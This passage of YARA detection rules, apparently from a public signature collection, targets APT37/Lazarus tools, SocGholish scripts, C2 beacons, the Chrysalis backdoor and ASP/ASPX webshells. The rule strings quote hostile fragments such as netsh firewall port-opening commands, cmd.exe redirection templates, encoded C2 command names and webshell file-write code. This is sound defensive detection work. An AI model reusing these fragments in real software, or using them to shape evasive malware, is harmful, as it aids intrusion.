		reference = "https://labs.f-secure.com/publications/ti-report-lazarus-group-cryptocurrency-vertical"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_lazarus_aug20.yar#L17-L41"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "bfc3cf400eeea332e2e44b65f9728e94af0adde76b32ed4be527b25484f80745"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$str_netsh_1 = "netsh firewall add portopening TCP %d" ascii wide nocase
		$str_netsh_2 = "netsh firewall delete portopening TCP %d" ascii wide nocase
		$str_mask_1 = "cmd.exe /c \"%s >> %s 2>&1\"" ascii wide
		$str_mask_2 = "cmd.exe /c \"%s 2>> %s\"" ascii wide
		$str_mask_3 = "%s\\%s\\%s" ascii wide
		$str_other_1 = "perflog.dat" ascii wide nocase
		$str_other_2 = "perflog.evt" ascii wide nocase
		$str_other_3 = "cbstc.log" ascii wide nocase
		$str_other_4 = "LdrGetProcedureAddress" ascii
		$str_other_5 = "NtProtectVirtualMemory" ascii

	condition:
		int16 ( 0 ) == 0x5a4d and filesize < 3000KB and 1 of ( $str_netsh* ) and 1 of ( $str_mask* ) and 1 of ( $str_other* )
}
rule SIGNATURE_BASE_HKTL_Khepri_Beacon_Sep21_1 : FILE
{
	meta:
		description = "Detects Khepri C2 framework beacons"
		author = "Florian Roth (Nextron Systems)"
		id = "b2c8aaf7-7953-55a3-8499-565800fa01f1"
		date = "2021-09-08"
		modified = "2023-12-05"
		reference = "https://github.com/geemion/Khepri/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_khepri.yar#L2-L44"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "86c48679db5f4c085fd741ebec5235bc6cf0cdf8ef2d98fd8a689ceb5088f431"
		logic_hash = "c688dbda6006ef28305285f6aeec24a23cbfe9174d09cf4e3586bd0cf7290e60"
		score = 90
		quality = 85
		tags = "FILE"

	strings:
		$x1 = "NT %d.%d Build %d  ProductType:%s" ascii fullword
		$xe1 = "YzIuQ01EUEFSQU0uY21k" ascii
		$xe2 = "MyLkNNRFBBUkFNLmNtZ" ascii
		$xe3 = "jMi5DTURQQVJBTS5jbW" ascii
		$sx1 = "c2.ProcessItem.user" ascii fullword
		$sx2 = "c2.CMDPARAM.cmd" ascii fullword
		$sx3 = "c2.DownLoadFile.file_path" ascii fullword
		$sa1 = "file size zero"
		$sa2 = "cmd.exe /c "
		$sa3 = "error parse param"
		$sa4 = "innet_ip"
		$op1 = { c3 b9 b4 98 49 00 87 01 5d c3 b8 b8 98 49 00 c3 8b ff }
		$op2 = { 8b f1 80 3d 58 97 49 00 00 0f 85 96 00 00 00 33 c0 40 b9 50 97 49 00 87 01 33 db }
		$op3 = { 90 d5 0c 43 00 34 0d 43 00 ea 0c 43 00 7e 0d 43 00 b6 0d 43 00 cc }
		$op4 = { 69 c0 ff 00 00 00 8b 4d c0 23 88 40 7c 49 00 89 4d c0 8b 45 cc 0b 45 c0 89 45 cc 8b 45 d0 }

	condition:
		( uint16( 0 ) == 0x5a4d or uint32be( 0 ) == 0x7f454c46 ) and filesize < 2000KB and ( 1 of ( $x* ) or 2 of ( $sx* ) or all of ( $sa* ) or 3 of ( $op* ) ) or ( filesize < 10MB and 1 of ( $xe* ) ) or 5 of them
}
rule SIGNATURE_BASE_APT_CN_Group_Loader_Jan20_1
{
	meta:
		description = "Detects loaders used by Chinese groups"
		author = "Vitali Kremez"
		id = "c85ae499-4f76-56ff-877d-887e1a7fc077"
		date = "2020-02-01"
		modified = "2025-08-11"
		reference = "https://twitter.com/VK_Intel/status/1223411369367785472?s=20"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_winnti.yar#L271-L283"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "30a180ada2390ca8df4bf7883624a5a176249622b4c34ce96931fe62b09ea8e3"
		score = 80
		quality = 85
		tags = ""

	strings:
		$xc1 = { 8B C3 C1 E3 10 C1 E8 10 03 D8 6B DB 77 83 C3 13 }

	condition:
		1 of them
}
rule SIGNATURE_BASE_EXT_MAL_JS_Socgholish_Mar21_1 : JS SOCGHOLISH FILE
{
	meta:
		description = "Triggers on SocGholish JS files"
		author = "Nils Kuhnert"
		id = "3ed7d2da-569b-5851-a821-4a3cda3e13ce"
		date = "2021-03-29"
		modified = "2023-01-02"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/crime_socgholish.yar#L25-L51"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "7ccbdcde5a9b30f8b2b866a5ca173063dec7bc92034e7cf10e3eebff017f3c23"
		hash = "f6d738baea6802cbbb3ae63b39bf65fbd641a1f0d2f0c819a8c56f677b97bed1"
		hash = "c7372ffaf831ad963c0a9348beeaadb5e814ceeb878a0cc7709473343d63a51c"
		logic_hash = "08218ae952577a6ac936de875236cdc3ae32e3aaccd2196b7f43e80d7e748584"
		score = 75
		quality = 85
		tags = "JS, SOCGHOLISH, FILE"

	strings:
		$s1 = "new ActiveXObject('Scripting.FileSystemObject');" ascii
		$s2 = "['DeleteFile']" ascii
		$s3 = "['WScript']['ScriptFullName']" ascii
		$s4 = "['WScript']['Sleep'](1000)" ascii
		$s5 = "new ActiveXObject('MSXML2.XMLHTTP')" ascii
		$s6 = "this['eval']" ascii
		$s7 = "String['fromCharCode']"
		$s8 = "2), 16)," ascii
		$s9 = "= 103," ascii
		$s10 = "'00000000'" ascii

	condition:
		filesize > 3KB and filesize < 5KB and 8 of ( $s* )
}
rule SIGNATURE_BASE_Socgholish_JS_22_02_2022 : FILE
{
	meta:
		description = "Detects SocGholish fake update Javascript files 22.02.2022"
		author = "Wojciech Cieślak"
		id = "68d2dbb7-0079-527a-92c7-450c3dd953b3"
		date = "2022-02-22"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/crime_socgholish.yar#L53-L72"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "3e14d04da9cc38f371961f6115f37c30"
		hash = "dffa20158dcc110366f939bd137515c3"
		hash = "afee3af324951b1840c789540d5c8bff"
		hash = "c04a1625efec27fb6bbef9c66ca8372b"
		hash = "d08a2350df5abbd8fd530cff8339373e"
		logic_hash = "fd529cbb511ff6bcf37b44b835e021b28763922f7726ff67db5cbb3f9193c7ae"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$s1 = "encodeURIComponent(''+" ascii
		$s2 = "['open']('POST'," ascii
		$s3 = "new ActiveXObject('MSXML2.XMLHTTP');" ascii

	condition:
		filesize < 5KB and all of them
}
rule SIGNATURE_BASE_Hvs_APT37_Smb_Scanner : FILE
{
	meta:
		description = "Unknown smb login scanner used by APT37"
		author = "Marc Stroebel"
		id = "89a5cc32-f151-583d-823d-692de2c2b084"
		date = "2020-12-15"
		modified = "2023-12-05"
		reference = "https://www.hybrid-analysis.com/sample/d16163526242508d6961f061aaffe3ae5321bd64d8ceb6b2788f1570757595fc?environmentId=2"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_lazarus_dec20.yar#L2-L29"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "0bea71db7052f1c22c01cfbf710d4ed24651cbbd8b0fd29f09dfd49c4e314028"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "Scan.exe StartIP EndIP ThreadCount logfilePath [Username Password Deep]" fullword ascii
		$s2 = "%s - %s:(Username - %s / Password - %s" fullword ascii
		$s3 = "Load mpr.dll Error " fullword ascii
		$s4 = "Load Netapi32.dll Error " fullword ascii
		$s5 = "%s U/P not Correct! - %d" fullword ascii
		$s6 = "GetNetWorkInfo Version 1.0" fullword wide
		$s7 = "Hello World!" fullword wide
		$s8 = "%s Error: %ld" fullword ascii
		$s9 = "%s U/P Correct!" fullword ascii
		$s10 = "%s --------" fullword ascii
		$s11 = "%s%-30s%I64d" fullword ascii
		$s12 = "%s%-30s(DIR)" fullword ascii
		$s13 = "%04d-%02d-%02d %02d:%02d" fullword ascii
		$s14 = "Share:              Local Path:                   Uses:   Descriptor:" fullword ascii
		$s15 = "Share:              Type:                   Remark:" fullword ascii

	condition:
		uint16( 0 ) == 0x5a4d and filesize < 200KB and ( 10 of them )
}
rule SIGNATURE_BASE_Hvs_APT37_Cred_Tool : FILE
{
	meta:
		description = "Unknown cred tool used by APT37"
		author = "Markus Poelloth"
		id = "e830025a-f2ac-55b1-aca3-ded9dba83a67"
		date = "2020-12-15"
		modified = "2023-12-05"
		reference = "https://www.hvs-consulting.de/media/downloads/ThreatReport-Lazarus.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_lazarus_dec20.yar#L31-L50"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "4fb7247b88f2d252e7c9d5034c209945bc9e17f49de3dcdb5bf50b5afb302987"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel>" fullword ascii
		$s2 = "Domain Login" fullword ascii
		$s3 = "IEShims_GetOriginatingThreadContext" fullword ascii
		$s4 = " Type Descriptor'" fullword ascii
		$s5 = "User: %s" fullword ascii
		$s6 = "Pass: %s" fullword ascii
		$s7 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">" fullword ascii
		$s8 = "E@c:\\u" fullword ascii

	condition:
		filesize < 500KB and 7 of them
}

rule SIGNATURE_BASE_Hvs_APT37_RAT_Loader
{
	meta:
		description = "BLINDINGCAN RAT loader named iconcash.db used by APT37"
		author = "Marc Stroebel"
		id = "6c3e8465-d607-59bf-85fc-5abbef71fb1c"
		date = "2020-12-15"
		modified = "2023-12-05"
		reference = "https://us-cert.cisa.gov/ncas/analysis-reports/ar20-232a"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_lazarus_dec20.yar#L52-L65"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "b70e66d387e42f5f04b69b9eb15306036702ab8a50b16f5403289b5388292db9"
		logic_hash = "241f2683adc29e8aca30ae24278f3703fef0fed6b276dae488fdb32c167af1c9"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	condition:
		(pe.version_info [ "OriginalFilename" ] contains "MFC_DLL.dll" ) and ( pe.exports ( "SMain" ) and pe.exports ( "SMainW" ) )
}
rule SIGNATURE_BASE_Hvs_APT37_Webshell_Img_Thumbs_Asp : FILE
{
	meta:
		description = "Webshell named img.asp, thumbs.asp or thumb.asp used by APT37"
		author = "Moritz Oettle"
		id = "e45d4507-81de-5f72-9ce2-4f0e3e5c62b1"
		date = "2020-12-15"
		modified = "2023-12-05"
		reference = "https://www.hvs-consulting.de/media/downloads/ThreatReport-Lazarus.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_lazarus_dec20.yar#L68-L95"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "94d2448d3794ae3f29678a7337473d259b5cfd1c7f703fe53ee6c84dd10a48ef"
		logic_hash = "58ccee11c08330c8cd4148e623a2e59e024d6d5f3067331dbdd962d0f6a8daa4"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "strMsg = \"E : F\"" fullword ascii
		$s2 = "strMsg = \"S : \" & Len(fileData)" fullword ascii
		$s3 = "Left(workDir, InStrRev(workDir, \"/\")) & \"video\""
		$a1 = "Server.CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
		$a2 = "Dim tmpPath, workDir" fullword ascii
		$a3 = "Dim objFSO, objTextStream" fullword ascii
		$a4 = "workDir = Request.ServerVariables(\"URL\")" fullword ascii
		$a5 = "InStrRev(workDir, \"/\")" ascii
		$g1 = "WriteFile = 0" fullword ascii
		$g2 = "fileData = Request.Form(\"fp\")" fullword ascii
		$g3 = "fileName = Request.Form(\"fr\")" fullword ascii
		$g4 = "Err.Clear()" fullword ascii
		$g5 = "Option Explicit" fullword ascii

	condition:
		filesize < 2KB and ( ( 1 of ( $s* ) ) or ( 3 of ( $a* ) ) or ( 5 of ( $g* ) ) )
}
rule SIGNATURE_BASE_Hvs_APT37_Webshell_Template_Query_Asp : FILE
{
	meta:
		description = "Webshell named template-query.aspimg.asp used by APT37"
		author = "Moritz Oettle"
		id = "dc006b46-4c51-59cd-8b7d-adbfec86cd2e"
		date = "2020-12-15"
		modified = "2023-12-05"
		reference = "https://www.hvs-consulting.de/media/downloads/ThreatReport-Lazarus.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/apt_lazarus_dec20.yar#L97-L120"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "961a66d01c86fa5982e0538215b17fb9fae2991331dfea812b8c031e2ceb0d90"
		logic_hash = "d8bd017e9103bddb0b8a86effa8a4b0617b54bd643bcc36b6f678a3e60f8559f"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$g1 = "server.scripttimeout=600" fullword ascii
		$g2 = "response.buffer=true" fullword ascii
		$g3 = "response.expires=-1" fullword ascii
		$g4 = "session.timeout=600" fullword ascii
		$a1 = "redhat hacker" ascii
		$a2 = "want_pre.asp" ascii
		$a3 = "vgo=\"admin\"" ascii
		$a4 = "ywc=false" ascii
		$s1 = "public  br,ygv,gbc,ydo,yka,wzd,sod,vmd" fullword ascii

	condition:
		filesize > 70KB and filesize < 200KB and ( ( 1 of ( $s* ) ) or ( 2 of ( $a* ) ) or ( 3 of ( $g* ) ) )
}
rule SIGNATURE_BASE_MAL_Chrysalis_Dllloader_Feb26 : FILE
{
	meta:
		description = "Detects DLL used to load Chrysalis backdoor, seen being used in the compromise of the infrastructure hosting Notepad++ by Chinese APT group Lotus Blossom"
		author = "X__Junior"
		id = "a2bf8cde-36a5-565d-9257-f1a4b2d67adc"
		date = "2026-02-02"
		modified = "2026-05-15"
		reference = "https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/lotusblossom_notepad_exploitation.yar#L1-L15"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "3bdc4c0637591533f1d4198a72a33426c01f69bd2e15ceee547866f65e26b7ad"
		logic_hash = "5e118287bd048788a746d412d00ddd2596224b30562d66c4441738fcc09cee87"
		score = 80
		quality = 85
		tags = "FILE"

	strings:
		$op1 = { 33 D2 8B C1 F7 F6 0F B6 C1 03 55 ?? 6B C0 ?? 32 02 88 04 0F 41 83 F9 ?? 72 }
		$op2 = { 0F B6 04 31 41 33 C2 69 D0 ?? ?? ?? ?? 3B CB 72 }

	condition:
		uint16( 0 ) == 0x5a4d and all of them
}
rule SIGNATURE_BASE_MAL_Chrysalis_Shellcode_Loader_Feb26
{
	meta:
		description = "Detects shellcode used to load Chrysalis backdoor, seen being used in the compromise of the infrastructure hosting Notepad++ by Chinese APT group Lotus Blossom"
		author = "X__Junior"
		id = "4dce8370-19d3-579a-b1c7-7dd9fbe51ee6"
		date = "2026-02-02"
		modified = "2026-05-15"
		reference = "https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/lotusblossom_notepad_exploitation.yar#L17-L31"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "e2e3d78437cf9d48c2b2264e44bb36bc2235834fc45bbb50b5d6867f336711e3"
		logic_hash = "1baf027548cc1f501e2f99d4a337eaafec1e8ac2c48420cbff25c396083b6273"
		score = 80
		quality = 85
		tags = ""

	strings:
		$op1 = { 8B C7 03 D7 83 E0 ?? 47 8A 4C 05 ?? 8A 04 13 02 C1 32 C1 2A C1 88 02 8B 55 ?? 3B FE 7C ?? 8B 5D ?? 8B 45 }
		$op2 = { 03 F8 8B 45 ?? 8B 50 ?? 85 C9 79 ?? 0F B7 C1 EB ?? 8D 41 ?? 03 C3 50 FF 75 ?? FF D2 89 07 85 C0 74 ?? 8B 4D ?? 46 }

	condition:
		1 of them
}
rule SIGNATURE_BASE_MAL_Chrysalis_Backdoor_Feb26
{
	meta:
		description = "Detects Chrysalis backdoor, seen being used in the compromise of the infrastructure hosting Notepad++ by Chinese APT group Lotus Blossom"
		author = "X__Junior"
		id = "c3621431-9e20-5497-ad0a-e371063e7656"
		date = "2026-02-02"
		modified = "2026-05-15"
		reference = "https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/lotusblossom_notepad_exploitation.yar#L33-L51"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "e2e3d78437cf9d48c2b2264e44bb36bc2235834fc45bbb50b5d6867f336711e3"
		logic_hash = "9df8794d9927b92f0810321901aa7836f6a404d48c121818f24473e92875ecc4"
		score = 80
		quality = 85
		tags = ""

	strings:
		$opa1 = { 8B 4D ?? C1 CF ?? C1 C1 ?? 03 F9 D1 C3 8B 4D ?? C1 C1 ?? 03 F9 03 FB 8B 5D ?? 69 CF ?? ?? ?? ?? BF ?? ?? ?? ?? 2B F9 EB }
		$opa2 = { F7 E9 [0-1] 8B C2 C1 E8 ?? 03 C2 8D 0C 40 8A C3 34 ?? [0-2] 0F B6 [1-4] 0F B6 C3 8B 5D [1-3] 0F 45 D0 }
		$opb1 = { 0F B6 84 35 ?? ?? ?? ?? 88 84 3D ?? ?? ?? ?? 88 8C 35 ?? ?? ?? ?? 0F B6 84 3D ?? ?? ?? ?? 8B 8D ?? ?? ?? ?? 03 C2 0F B6 C0 0F B6 84 05 ?? ?? ?? ?? 30 04 19 43 3B 9D ?? ?? ?? ?? 7C }

	condition:
		(1 of ( $opa* ) and $opb1 ) or all of ( $opa* )
}
rule SIGNATURE_BASE_MAL_Cobaltstrike_Beacon_Loader_Feb26 : FILE
{
	meta:
		description = "Detects Cobalt Strike beacon loader"
		author = "X__Junior"
		id = "9d6888d0-64c6-5e52-a01a-8bcc51dd16b1"
		date = "2026-02-02"
		modified = "2026-05-15"
		reference = "https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/lotusblossom_notepad_exploitation.yar#L53-L73"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "0a9b8df968df41920b6ff07785cbfebe8bda29e6b512c94a3b2a83d10014d2fd"
		hash = "b4169a831292e245ebdffedd5820584d73b129411546e7d3eccf4663d5fc5be3"
		logic_hash = "949e70b1fb7f270a05d1626a12595ecab22bdec37a07e83c5cf64399506302a5"
		score = 80
		quality = 85
		tags = "FILE"

	strings:
		$opa1 = { 45 33 C9 41 B8 ?? ?? ?? ?? 48 8D 94 24 ?? ?? ?? ?? 48 8D 4C 24 ?? E8 ?? ?? ?? ?? 48 8D 8C 24 ?? ?? ?? ?? FF 15 ?? ?? ?? ?? 66 89 44 24 ?? 41 B8 ?? ?? ?? ?? 48 8D 94 24 ?? ?? ?? ?? 0F B7 4C 24 ?? FF 15 ?? ?? ?? ?? 48 8D 8C 24 ?? ?? ?? ?? FF 15 }
		$opa2 = { 4C 8D 4C 24 ?? 41 B8 ?? ?? ?? ?? BA ?? ?? ?? ?? 48 8D 8C 24 ?? ?? ?? ?? FF 15 ?? ?? ?? ?? FF 15 ?? ?? ?? ?? 48 C7 44 24 ?? ?? ?? ?? ?? C7 44 24 ?? ?? ?? ?? ?? 48 8D 8C 24 ?? ?? ?? ?? 48 89 4C 24 ?? 4C 8D 0D ?? ?? ?? ?? 45 33 C0 33 D2 48 8B C8 FF 15 }
		$opb1 = { 48 8D 89 ?? ?? ?? ?? 0F 10 00 0F 10 48 ?? 48 8D 80 ?? ?? ?? ?? 0F 11 41 ?? 0F 10 40 ?? 0F 11 49 ?? 0F 10 48 ?? 0F 11 41 ?? 0F 10 40 ?? 0F 11 49 ?? 0F 10 48 ?? 0F 11 41 ?? 0F 10 40 ?? 0F 11 49 ?? 0F 10 48 ?? 0F 11 41 ?? 0F 11 49 ?? 48 83 EA }
		$opb2 = { 45 33 C9 48 89 84 24 ?? ?? ?? ?? 41 B8 18 00 00 00 C7 84 24 ?? ?? ?? ?? 03 00 00 00 48 8D 94 24 ?? ?? ?? ?? 48 89 BC 24 ?? ?? ?? ?? B9 B9 00 00 00 FF 15 }

	condition:
		uint16( 0 ) == 0x5a4d and all of ( $opa* ) or all of ( $opb* )
}
rule SIGNATURE_BASE_MAL_POC_Microsoft_Warbird_Loader_Feb26 : FILE
{
	meta:
		description = "Detects a POC to turn Microsoft Warbird into a shellcode loader"
		author = "X__Junior"
		id = "a07f6d10-c463-56a6-a667-82b1c00760af"
		date = "2026-02-03"
		modified = "2026-05-15"
		reference = "https://cirosec.de/en/news/abusing-microsoft-warbird-for-shellcode-execution/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/lotusblossom_notepad_exploitation.yar#L75-L88"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "29d0467ee452752286318f350ceb28a2b04ee4c6de550ba0edc34ae0fa7cbb03"
		logic_hash = "daeae01f0d5103974ed011322db3b6a833ee0f67b8739a4e63d6b18704ffa605"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$op = { fe af fe ca ef be ad de }

	condition:
		uint16( 0 ) == 0x5a4d and $op
}

rule SIGNATURE_BASE_EXT_HKTL_Nighthawk_RAT : FILE
{
	meta:
		description = "Detects Nighthawk RAT"
		author = "Frank Boldewin (@r3c0nst)"
		id = "7a58b8bf-fb14-5758-bc2a-ad2c6fff1216"
		date = "2022-11-22"
		modified = "2025-07-01"
		reference = "https://www.proofpoint.com/us/blog/threat-insight/nighthawk-and-coming-pentest-tool-likely-gain-threat-actor-notice"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_nighthawk_c2.yar#L3-L30"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "0551ca07f05c2a8278229c1dc651a2b1273a39914857231b075733753cb2b988"
		hash = "9a57919cc5c194e28acd62719487c563a8f0ef1205b65adbe535386e34e418b8"
		hash = "38881b87826f184cc91559555a3456ecf00128e01986a9df36a72d60fb179ccf"
		hash = "f3bba2bfd4ed48b5426e36eba3b7613973226983a784d24d7a20fcf9df0de74e"
		hash = "b775a8f7629966592cc7727e2081924a7d7cf83edd7447aa60627a2b67d87c94"
		logic_hash = "46404445e1fee89b598b0d42888f793dd602533cff2f72524800597af5b61197"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$pattern1 = { 48 8d 0d ?? ?? ?? ?? 51 5a 48 81 c1 ?? ?? ?? ?? 48 81 c2 ?? ?? ?? ?? ff e2 }
		$pattern2 = { 66 03 D2 66 33 D1 66 C1 E2 02 66 33 D1 66 23 D0 0F B7 C1 }
		$pattern3 = { FF 7F 48 3B F0 48 0F 47 F0 48 8D }
		$pattern4 = { 65 48 8B 04 25 30 00 00 00 8B 40 68 49 89 CA 0F 05 C3 }
		$pattern5 = { 48 B8 AA AA AA AA AA AA AA 02 48 ?? ?? ?? ?? 0F 84 }
		$pattern6 = { 65 48 8B 04 25 30 00 00 00 48 8B 80 }

	condition:
		uint16( 0 ) == 0x5A4D and filesize < 2MB and ( 3 of ( $pattern* ) or ( pe.section_index ( ".profile" ) >= 0 and pe.section_index ( ".detourc" ) >= 0 and pe.section_index ( ".detourd" ) >= 0 ) )
}
rule SIGNATURE_BASE_HKTL_MAL_Nighthawk_Nov_2022_1 : NIGHTHAWK BEACON FILE
{
	meta:
		description = "Detect the Nighthawk dropped beacon"
		author = "Arkbird_SOLG"
		id = "a46d5034-e8e3-5c30-90d9-ea97b8384341"
		date = "2022-11-22"
		modified = "2025-07-01"
		reference = "https://web.archive.org/web/20221125224850/https://www.proofpoint.com/us/blog/threat-insight/nighthawk-and-coming-pentest-tool-likely-gain-threat-actor-notice"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/gen_nighthawk_c2.yar#L32-L50"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		hash = "0551ca07f05c2a8278229c1dc651a2b1273a39914857231b075733753cb2b988"
		hash = "9a57919cc5c194e28acd62719487c563a8f0ef1205b65adbe535386e34e418b8"
		hash = "f3bba2bfd4ed48b5426e36eba3b7613973226983a784d24d7a20fcf9df0de74e"
		logic_hash = "8dec7752ee6e1af87129ce7ac09130f94a20807c4f45ceb1fce434358ac727bf"
		score = 75
		quality = 85
		tags = "NIGHTHAWK, BEACON, FILE"

	strings:
		$s1 = { 44 8b ff 45 33 c0 48 8d 15 [2] 0a 00 48 8d 4d c0 e8 [2] ff ff 45 33 c0 48 8d 15 [2] 0a 00 48 8d 4d 20 e8 [2] ff ff 45 33 c0 48 8d 15 [2] 0a 00 48 8d 4d 00 e8 [2] ff ff 45 33 c0 48 8d 15 [2] 0a 00 48 8d 4d e0 e8 [2] ff ff 33 d2 e9 ee 04 00 00 48 8d 44 24 68 48 89 44 24 20 41 b9 01 00 00 00 45 33 c0 48 8d 95 a0 00 00 00 ff 15 [2] 09 00 85 c0 0f 85 74 04 00 00 48 89 7c 24 28 48 89 7c 24 20 45 33 c9 45 33 c0 48 8d 15 [2] 0a 00 48 8b 4c 24 68 ff 15 [2] 09 00 85 }
		$s2 = { 4d 85 c0 0f 84 83 00 00 00 49 21 18 33 d2 44 8d 43 01 33 c9 ff 15 [2] 08 00 48 8b f0 48 85 c0 74 6a 44 8d 43 04 48 8b d5 48 8b c8 ff 15 [2] 08 00 48 8b e8 48 85 c0 74 49 48 8d 44 24 70 33 d2 44 8d 4b 24 48 89 44 24 20 4c 8d 44 24 30 48 8b cd ff 15 [2] 08 00 8b }
		$s3 = { 48 85 c0 0f 84 [2] 00 00 4d 8b cc 49 83 7c 24 18 08 72 04 4d 8b 0c 24 4d 8b c5 49 83 7d 18 08 72 04 4d 8b 45 00 49 8b ?? 49 83 ?? 18 08 72 03 49 8b }
		$s4 = { 44 8b 44 24 44 4c 89 [2-3] 89 95 00 02 00 00 2b c7 8b d7 49 03 d0 48 03 d1 4c 8d 8d 00 02 00 00 44 8b c0 49 8b cf ff 15 [2] 04 00 33 d2 85 c0 0f 84 [2] ff ff 03 bd 00 02 00 00 8b 44 24 40 3b f8 48 8b 4d ?? 4c 8b }

	condition:
		uint16( 0 ) == 0x5A4D and filesize > 60KB and all of ( $s* )
}
rule SIGNATURE_BASE_WEBSHELL_ASPX_Xsltransform_Aug21 : FILE
{
	meta:
		description = "Detects an ASPX webshell utilizing XSL Transformations"
		author = "Max Altgelt"
		id = "44254084-a717-59e6-a3ac-eca3c1c864a8"
		date = "2020-02-23"
		modified = "2023-12-05"
		reference = "https://gist.github.com/JohnHammond/cdae03ca5bc2a14a735ad0334dcb93d6"
		source_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/yara/webshell_xsl_transform.yar#L1-L19"
		license_url = "https://github.com/Neo23x0/signature-base/blob/78d979eef87786a613659ee82e55abdd45572a78/LICENSE"
		logic_hash = "3ac0b50adc4c56769d0248e213e9426a22e0f5086bf081da57f835ff1c77b716"
		score = 75
		quality = 85
		tags = "FILE"

	strings:
		$csharpshell = "Language=\"C#\"" nocase
		$x1 = "<root>1</root>"
		$x2 = ".LoadXml(System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String("
		$s1 = "XsltSettings.TrustedXslt"
		$s2 = "Xml.XmlUrlResolver"
		$s3 = "FromBase64String(Request[\""

	condition:
